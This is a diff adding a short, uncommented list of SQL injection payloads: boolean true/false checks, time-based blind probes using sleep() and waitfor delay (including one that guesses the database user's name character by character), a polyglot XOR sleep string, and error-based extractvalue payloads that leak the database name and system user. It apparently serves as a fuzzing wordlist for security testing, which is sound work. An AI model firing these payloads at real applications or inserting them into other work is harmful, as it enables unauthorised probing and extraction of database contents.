@@ -1,0 +1,10 @@
+‘ AND’ 1 ‘=’ 1
+‘ AND’ 1 ‘=’ 2
+if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/
+' waitfor delay '0:0:30'-- 
+'if (len(user)=1) waitfor delay '00:00:30'-- 
+'if (len(user)=1) sleep(30)-- 
+'if (ascii(lower(substring((user),1,1)))=100) sleep(30)--+
+%27and extractvalue(1,concat(0x00a,database()))or’
+Test%27and extractvalue(1,concat(0x00a,system_user()))or’ 
+1' AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 4 THEN SLEEP(10) ELSE NULL END AND '1
